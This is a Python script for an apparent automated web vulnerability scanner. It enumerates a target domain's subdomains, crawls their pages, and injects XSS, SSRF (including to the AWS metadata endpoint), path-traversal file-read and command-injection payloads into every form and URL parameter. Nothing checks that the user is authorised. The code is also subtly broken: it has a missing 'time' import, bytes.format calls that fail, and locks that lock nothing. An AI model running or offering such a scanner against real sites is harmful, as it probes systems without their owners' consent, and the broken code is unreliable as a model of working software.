import sys
import requests # requests
import threading
from bs4 import BeautifulSoup # bs4
import socket
import dns.resolver # dnspy
import urllib
from urllib.parse import urlparse
from urllib.parse import urljoin
import json

target_domain = ""

""" vulndef """
vulndef = [
 {"name":"Cross site scripting (script)", "payload":"<script>alert(1);</script>", "status_code":0, "string":"<script>alert(1);</script>"},
 {"name":"Cross site scripting (svg)", "payload":"<svg/onload=\"alert(1);\">", "status_code":0, "string":"<svg/onload=\"alert(1);\">"},
 {"name":"Server side request forgery (file)", "payload":"file:///etc/passwd", "status_code":0, "string":"root:"},
 {"name":"Server side request forgery (aws)", "payload":"http://169.254.169.254/latest/meta-data/", "status_code":0, "string":"local-hostname"},
 {"name":"SQL Injection (single quote)", "payload":"'", "status_code":500, "string":""},
 {"name":"SQL Injection (double quote)", "payload":"\"", "status_code":500, "string":""},
 {"name":"Local file inclusion", "payload":"/etc/passwd", "status_code":0, "string":"root:"},
 {"name":"Local file inclusion (nullbyte)", "payload":"/etc/passwd%00", "status_code":0, "string":"root:"},
 {"name":"Local file inclusion (traversal)", "payload":"../../../../../../..//etc/passwd", "status_code":0, "string":"root:"},
 {"name":"Local file inclusion (traversal,nullbyte)", "payload":"../../../../../../..//etc/passwd%00", "status_code":0, "string":"root:"},
 {"name":"Command injection", "payload":"|id", "status_code":0, "string":"groups="},
 {"name":"Command injection (perl)", "payload":"|id|", "status_code":0, "string":"groups="}
]

""" other vars """
crawled_urls = []
exclude_ext = [".swf",".png",".jpg",".jpeg",".doc",".docx",".xlxs",".xls",".mp4",".mp3",".webm",".xml",".sql",".txt",".js",".css"]

""" opening wordlists and shit """
with open("wordlists/quicksubs.txt", "rb") as file:
 quick_subs_wordlist = file.read().decode(errors="ignore").splitlines()

""" log related functions """
def tee_log(log_data):
 if type(log_data) != bytes:
  log_data = log_data.encode(errors="ignore")
 with threading.Lock():
  rlogname = "runlogs/run_{}.log".format(target_domain)
  with open(rlogname, "ab") as file:
   file.write(log_data+b"\n")
  print(log_data.decode(errors="ignore"))

def clearlog():
 rlogname = "runlogs/run_{}.log".format(target_domain)
 with open(rlogname, "wb") as file:
  file.close()
  
""" util """
def fast_resolv(dom):
 try:
  resolver = dns.resolver.Resolver()
  #resolver.nameservers = nslist
  resolver.timeout = 1
  resolver.lifetime = 1
  answers = resolver.resolve(dom ,'A')
  return str(answers[0])
 except Exception as error:
  #print(error)
  return 0

def get_params_form(form, payload):
 data = {}
 formbits = ["input","textarea","select"]
 numpayload = 0
 for formbit in formbits:
  formbit_f_l = form.find_all(formbit)
  for formbit_f in formbit_f_l:
   if formbit_f.has_attr("name"):
    if formbit_f.has_attr("value"):
     data[formbit_f["name"]] = formbit_f["value"]
    else:  
     data[formbit_f["name"]] = payload
     numpayload += 1
 if numpayload > 0:
  return data
 else:
  return 0

""" scan modules """
def getsubs():
 subdomains = [target_domain]
 for i in quick_subs_wordlist:
  try:
   s_test = i+"."+target_domain
   resolvd = fast_resolv(s_test)
   if resolvd != 0:
    r = requests.get(url="https://{}".format(s_test), timeout=5)
    tee_log(s_test + " resolves to: " + resolvd + " and responds to HTTP probe.")
    subdomains.append(s_test)
  except Exception as error:
   print(error)
 return subdomains

def test_payload(url, data, vulnd, method):
 if method == "get":
  r = requests.get(url=url, data=data, timeout=5)
 else:
  r = requests.post(url=url, data=data, timeout=5)
 if (r.status_code == vulnd["status_code"]) or (vulnd["status_code"] == 0):
  if vulnd["string"] in r.text:
   tee_log(b"ALERT! {} is possibly vulnerable to {} with the following params(method: {})\n{}".format(url, vulnd["name"], method, json.dumps(data)))

def perform_tests(url_base, url, soup):
 tee_log("Performing tests on: {}".format(url))
 for form in soup.find_all("form"):
  if not form.has_attr("action"): continue
  action_target = urljoin(url, form["action"])
  tee_log("Testing form action: {}".format(action_target))
  for vulnd in vulndef:
   payload = vulnd["payload"]
   data = get_params_form(form, payload)
   if data == 0: break
   print("Method: POST")
   print(url)
   print(data)
   try:
    test_payload(url, data, vulnd, "post")
   except Exception as error:
    print(error)
 if "?" in url:
  url_params = url.split("?")[1]
  url = url.split("?")[0]
  url_params = urllib.parse.parse_qs(url_params)
  for vulnd in vulndef:
   payload = vulnd["payload"]
   for uk in url_params.keys():
    url_params[uk] = payload
   print("Method: GET")
   print(url)
   print(url_params)
   try:
    test_payload(url, url_params, vulnd, "get")
   except Exception as error:
    print(error)

def crawler(url_base, url, depth=0):
 global crawled_urls
 if url in crawled_urls: return
 with threading.Lock(): crawled_urls.append(url)
 urlpath = urlparse(url).path
 for bext in exclude_ext:
  if urlpath.endswith(bext):
   tee_log("Excluding url: {} bad extension".format(url))
   return
 tee_log("Crawling: {}".format(url)) 
 r = requests.get(url=url, timeout=5)
 datas_html = r.text
 soup = BeautifulSoup(datas_html, "html.parser")
 links_found = 0
 for lnk in soup.find_all("a"):
  if links_found >= 100: break
  try:
   if not lnk.has_attr("href"): continue
   url_new = urljoin(url, lnk["href"])
   if depth < 3 and not url_new in crawled_urls and url_new.startswith(url_base):
    try:
     crawler(url_base, url_new, depth+1)
    except Exception as error:
     print(error)
    links_found += 1
  except Exception as error:
   return 0
 perform_tests(url_base, url, soup)
   
def crawl(subdomain):
 url_base = "https://{}".format(subdomain)
 try:
  crawler(url_base, url_base)
 except Exception as error:
  print(error)
 
""" scan logic """
def scan():
 subdomains = getsubs()
 for subdomain in subdomains:
  while threading.active_count() > 30: time.sleep(1)
  t=threading.Thread(target=crawl, args=(subdomain,))
  t.start()

""" main execution """
def main():
 global target_domain
 if len(sys.argv) < 2:
  print("python main.py <domain>")
  sys.exit(0)
 target_domain = sys.argv[1]
 clearlog()
 tee_log(b"Starting scan...")
 tee_log(b"Enumerating subdomains...")
 scan()
 
if __name__ == '__main__':
 main()